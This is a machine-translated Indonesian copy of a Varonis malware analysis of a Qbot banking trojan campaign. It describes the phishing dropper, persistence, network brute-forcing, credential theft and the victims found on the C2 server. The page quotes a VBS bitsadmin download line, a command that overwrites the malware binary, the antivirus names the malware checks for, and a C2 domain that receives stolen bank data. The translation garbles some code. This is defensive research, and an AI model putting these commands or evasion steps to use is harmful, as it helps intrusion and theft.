<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🙇🏽 🙍🏽 🚶 Qbot kembali. Varonis memperkenalkan analisis terperinci dari Trojan Qbot perbankan 🏝️ 🚦 ⏭️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Grup Penelitian Keselamatan Varonis Ditemukan dan Diselidiki 
 serangan cyber global menggunakan jenis malware baru 
 menyediakan qbot. Kampanye ini s...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Qbot kembali. Varonis memperkenalkan analisis terperinci dari Trojan Qbot perbankan</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/450208/">  Grup Penelitian Keselamatan Varonis Ditemukan dan Diselidiki <br>  serangan cyber global menggunakan jenis malware baru <br>  menyediakan qbot.  Kampanye ini secara aktif menargetkan perusahaan-perusahaan AS, tetapi telah menjangkau jaringan di seluruh dunia - dengan korban di seluruh Eropa, Asia, Rusia dan Amerika Selatan - untuk mencuri informasi keuangan rahasia, termasuk kredensial rekening bank. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/eg/hg/lp/eghglp-mgqj0m81re6m6jgxf6qw.jpeg"></div><a name="habracut"></a><br>  Selama analisis, kami mem-parsing kode untuk variasi Qbot ini dan mengidentifikasi pusat komando kontrol serangan yang bekerja, yang memungkinkan kami untuk menentukan tingkat infeksi.  Pengamatan langsung dari server C2 mengungkapkan bahwa ribuan korban di seluruh dunia sudah dikompromikan dan secara aktif dipantau oleh penjahat cyber.  Informasi tambahan yang ditemukan di server C&amp;C juga mengungkapkan jejak peserta langsung di balik kampanye ini. <br><br>  Serangan itu awalnya ditemukan oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Varonis DatAlert</a> , di salah satu dari kami <br>  Pelanggan Amerika Utara.  Varonis DatAlert memperingatkan tentang memuat perangkat lunak yang mencurigakan, bergerak di dalam batas keamanan (gerakan lateral internal), dan aktivitas jaringan yang mencurigakan. <br><br>  Tim kami saat ini secara aktif berkolaborasi dengan pihak berwenang yang menyelidiki insiden ini dan telah memberi mereka informasi non-publik tambahan.  Dalam artikel ini, kami akan membagikan informasi yang diizinkan untuk diungkapkan. <br><br><h2>  Versi baru malware Qbot perbankan </h2><br>  Operator kampanye jahat ini menggunakan versi baru Qbot, malware terkenal dan canggih yang dirancang untuk mencuri kredensial bank.  Qbot menggunakan metode anti-analisis canggih, sering menghindar dari deteksi dan menggunakan vektor infeksi baru untuk maju dari langkah-langkah perlindungan yang tersedia. <br><br>  Malware ini bersifat polimorfik dan terus berubah sendiri: <br><br><ul><li>  dia membuat file dan folder dengan nama acak </li><li>  pemutakhiran loadernya sering mengubah server C2 </li><li>  pengunduh malware berubah ketika ada koneksi Internet aktif (lebih lanjut tentang ini nanti) </li></ul><br>  Qbot (atau Qakbot) pertama kali diidentifikasi pada tahun 2009 dan telah berevolusi secara signifikan sejak saat itu.  Ini terutama dimaksudkan untuk mengumpulkan data dari sesi internet online dan data yang terkait dengan situs web keuangan.  Kemampuan worm jaringannya memungkinkannya menyebar melalui jaringan organisasi dan menginfeksi sistem lain. <br><br><h2>  Penemuan </h2><br>  Tim kami memulai penyelidikan setelah panggilan pelanggan, di mana DatAlert yang sudah diterapkan memperingatkan aktivitas mencurigakan dalam sistemnya.  Investigasi mengungkapkan bahwa, <br>  setidaknya satu komputer terinfeksi malware, dan upaya untuk menyebar ke server jaringan lain telah diidentifikasi. <br><br>  Sampel cacing diekstraksi dan dikirim untuk analisis ke tim peneliti Varonis.  Pola tersebut tidak cocok dengan hash yang ada, dan penelitian lebih lanjut mengungkapkan bahwa itu adalah strain baru. <br><br><h2>  <b>Tahap satu: pipet</b> </h2><br>  Nama File: REQ_02132019b.doc.vbs <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  Dalam versi Qbot sebelumnya, makro dijalankan di komputer korban di dalam dokumen Word.  Selama penyelidikan kami, file zip dengan ekstensi .doc.vbs juga terdeteksi, menunjukkan bahwa infeksi awal mungkin dilaksanakan melalui <br>  email phishing, dari mana skrip jahat VBS (Visual Basic Script) diluncurkan. <br><br>  Setelah eksekusi, VBS mengidentifikasi versi sistem operasi dari mesin korban dan mencoba untuk mendeteksi perangkat lunak anti-virus yang diinstal.  Malware mencari baris berikut: Pembela, Virus, Antivirus, Malw, Trend, Kaspersky, Kav, McAfee, Symantec. <br><br>  Di versi baru, malware menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">BITSAdmin</a> untuk mengunduh bootloader.  Ini adalah perilaku baru, karena PowerShell digunakan di versi malware sebelumnya. <br><br>  BITSAdmin mengunduh bootloader dari salah satu situs berikut: <br><br><img src="https://habrastorage.org/webt/6e/ch/oe/6echoe9sgeheylwtvxsc5igaub0.png"><br><br>  Dan di sini adalah kode VBS untuk mengunduh bootloader menggunakan BITSAdmin: <br><br><pre><code class="plaintext hljs">intReturn = wShell.Run ('bitsadmin / transfer qahdejob' &amp; Second (Now) &amp; '/ Priority HIGH '&amp; el &amp; urlStr ' ' &amp; tempFile, 0, True)</code> </pre> <br><h2>  <b>Tahap kedua: untuk mendapatkan pijakan dan mengambil root di explorer.exe</b> </h2><br>  Nama file: widgetcontrol.png <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  Bootloader, yang berisi kernel dari program jahat, memiliki beberapa versi dan terus diperbarui bahkan setelah eksekusi.  Versi yang diterima korban setelah infeksi tergantung pada parameter <i>sp</i> , yang di-hardcode dalam file VBS. <br><br>  Fitur jahat adalah bahwa setiap versi bootloader ditandatangani dengan sertifikat digital yang berbeda.  Sertifikat tepercaya biasanya menunjukkan bahwa file tersebut tepercaya, sementara file yang dapat dieksekusi yang tidak ditandatangani mencurigakan. <br><br>  Qbot diketahui menggunakan sertifikat digital yang palsu atau dicuri untuk mendapatkan kredibilitas dan menghindari deteksi dalam sistem operasi. <br><br>  Kami mengunduh semua versi bootloader yang tersedia (lihat Indikator kompromi di bawah) dan membandingkan sertifikat. <br><br>  <b>Sertifikat yang digunakan oleh malware:</b> <br><br><ul><li>  Saiitech Systems Limited </li><li>  Ecdjb terbatas </li><li>  Hitish Patel Consulting Ltd </li><li>  Doorga terbatas </li><li>  INTENTEK TERBATAS </li><li>  Austek Consulting Limited </li><li>  IO Pro Limited </li><li>  Vercoe IT Ltd </li><li>  Edsabame Consultants Ltd </li><li>  KONSULTASI SOVA LTD </li></ul><br>  <b>Contoh salah satu sertifikat:</b> <br><br><img src="https://habrastorage.org/webt/ak/03/wd/ak03wdaoe8y68acfcuymz3ddup8.png"><br><br><h3>  <b>Ikat</b> </h3><br>  Pada peluncuran pertama, bootloader menyalin dirinya ke% Appdata% \ Roaming \ {Random line} dan kemudian membuat yang berikut: <br><ul><li>  <b>Daftar:</b> menulis sendiri ke kunci registri terkenal untuk mengeksekusi ketika pengguna login: <br><br>  HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run </li><li>  <b>Penjadwal Tugas:</b> tugas dibuat untuk meluncurkan malware setiap 5 jam dari jalur di bawah ini <br>  % Appdata% \ Roaming \ Microsoft \ {String Acak} </li><li>  <b>Startup:</b> Qbot membuat jalan pintas di direktori Startup-pengguna autostart </li></ul><br><br><h3>  <b>Explorer.exe yang terinfeksi</b> </h3><br>  Bootloader memulai proses explorer.exe 32-bit explorer dan kemudian menyuntikkannya ke dalamnya. <br>  muatan utama. <br><br>  Berikut adalah dump dari proses explorer.exe dengan payload yang sudah diinstal sebagai segmen memori RWX: <br><br><img src="https://habrastorage.org/webt/1w/w3/eb/1ww3ebpmwpwxesnekir2detqvxo.png"><br><br>  Setelah implementasi, bootloader menimpa executable aslinya dengan versi 32-bit dari calc.exe: <br><br>  "C: \ Windows \ System32 \ cmd.exe" / c ping.exe-N 6 127.0.0.1 &amp; ketik "C: \ Windows \ System32 \ calc.exe"&gt; C: \ Users \ {TKTKTK} \ Desktop \ 1 .exe <br><br><h2>  <b>Tahap Tiga: diam-diam menyelinap dan mencuri uang</b> </h2><br>  Setelah diperbaiki dalam sistem, modul brute force mulai menyortir kata sandi dan akun melalui jaringan.  Jika malware berhasil mengompromikan akun domain, maka ia membaca daftar pengguna grup Pengguna Domain dan mulai memilah-milah akun ini.  Jika akun lokal dikompromikan, malware menggunakan daftar standar pengguna lokal yang sudah dikonfigurasi sebelumnya.  Upaya otentikasi menggunakan NTLM dan WNetAddConnection API. <br><br>  Kami mengekstrak nama pengguna dan kata sandi yang digunakan oleh malware ketika mencoba untuk mengulangi melalui akun lokal (di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> ).  Suatu program jahat menyembunyikan kamus-kamus ini dari analisis statis, tetapi mereka dapat diekstraksi pada saat dijalankan. <br><br>  Gambar explorer X32dbg Explorerr.exe yang mencoba untuk terhubung ke komputer jarak jauh dengan pengguna Administrator dan kata sandi 12345678: <br><br><img src="https://habrastorage.org/webt/co/sn/iu/cosniu9q3xin4fjj5w1blhjuhhw.png"><br><br><h3>  <b>Bawa uangmu</b> </h3><br>  Tujuan utama Qbot adalah pencurian uang dari para korbannya;  ia menggunakan beberapa metode untuk mencuri informasi keuangan, akuntansi, dan lainnya dan mengirimkannya ke server penyerang: <br><br><ul><li>  Keylogger - Qbot menangkap dan mengirim setiap keystroke yang dimasukkan oleh korban dan mengunduhnya ke penyerang </li><li>  Kredensial / cookie sesi - Qbot mencari kredensial / cookie tersimpan dari browser dan mengirimkannya ke penyerang </li><li>  Wiretapping - payload berbahaya tertanam di semua proses dalam sistem dengan kode yang memotong panggilan API dan mencari garis keuangan / bank, kredensial atau cookie sesi dari proses dan memuatnya ke penyerang. </li></ul><br>  Gambar di bawah ini menunjukkan bahwa selama otentikasi di situs web bank buisnessline.huntington.com, program jahat mengirim data permintaan POST dan cookie sesi ke konten server C2.bigflimz.com: <br><br><img src="https://habrastorage.org/webt/nf/fn/4f/nffn4foeopdjhbdzkfsasez0vwi.png"><br><br><h2>  <b>Di dalam server penyerang C2</b> </h2><br>  Di salah satu situs penyerang, kami dapat menemukan file log yang berisi alamat IP para korban, informasi tentang sistem operasi dan nama-nama produk anti-virus.  Server C2 menunjukkan informasi tentang serangan masa lalu, serta versi tambahan dari program jahat (tabel versi di bagian Indikator Kompromi di bawah). <br><br><img src="https://habrastorage.org/webt/tf/rp/wz/tfrpwzx45qycmrywkizrhry5iaa.png"><br><br>  Beberapa hasil mungkin berisi duplikat, tetapi di bawah ini adalah 10 negara teratas, produk antivirus, dan sistem operasi yang ditemukan.  Diketahui juga bahwa para korban serangan itu adalah organisasi keuangan besar di Rusia. <br><br>  Semua data diunggah ke <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">repositori Github</a> kami. <br><br>  Kami menemukan 2.726 alamat IP unik untuk para korban.  Karena banyak organisasi menggunakan terjemahan alamat port NAT, yang menutupi alamat IP internal, jumlah korban, <br>  mungkin akan ada lebih banyak. <br><br><img src="https://habrastorage.org/webt/w1/ry/oe/w1ryoet4hg6ivu6hbh_-dodqaag.png" alt="Korban menurut negara" align="left"><br>  <i>Figur: korban oleh negara</i> <br><br><img src="https://habrastorage.org/webt/co/7f/cf/co7fcfsxpr7ymrj_uhptwnx32ts.png" alt="Korban dengan sistem operasi" align="left"><br>  <i>Gambar: korban oleh sistem operasi</i> <br><br><img src="https://habrastorage.org/webt/sx/yo/km/sxyokme-8i6f7croamzgfaprphm.png" alt="Korban oleh antivirus digunakan" align="left"><br>  <i>Gambar: korban oleh antivirus yang digunakan</i> <br><br><h2>  <b>Indikator Kompromi</b> </h2><br>  Semua indikator kompromi dapat ditemukan di Github di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  <b>Versi Bootloader</b> <br>  Daftar lengkap dapat ditemukan di <a href="">sini</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id450208/">https://habr.com/ru/post/id450208/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id450196/index.html">Konferensi Arsitek. Bagaimana itu?</a></li>
<li><a href="../id450198/index.html">Evgeny Kanevsky: "Negara tidak melihat masa depan yang baik dari peralatan kecil"</a></li>
<li><a href="../id450200/index.html">"Berkontribusi pada ekosistem Samsung!" - Persaingan ide. Hadiah Utama - Galaxy S10</a></li>
<li><a href="../id450202/index.html">Python dalam Visual Studio Code. Edisi April</a></li>
<li><a href="../id450206/index.html">Kiat untuk pengembang pemula</a></li>
<li><a href="../id450210/index.html">Sebarkan sayap Anda: bagaimana pengawasan video membantu ornitolog menyelamatkan burung langka</a></li>
<li><a href="../id450214/index.html">Menjalankan IntelliJ IDEA Inspections on Jenkins</a></li>
<li><a href="../id450216/index.html">Liburan atau liburan?</a></li>
<li><a href="../id450222/index.html">5 layanan pemasaran digital keren tidak terdengar di Rusia</a></li>
<li><a href="../id450228/index.html">10 mitos tentang rabies</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>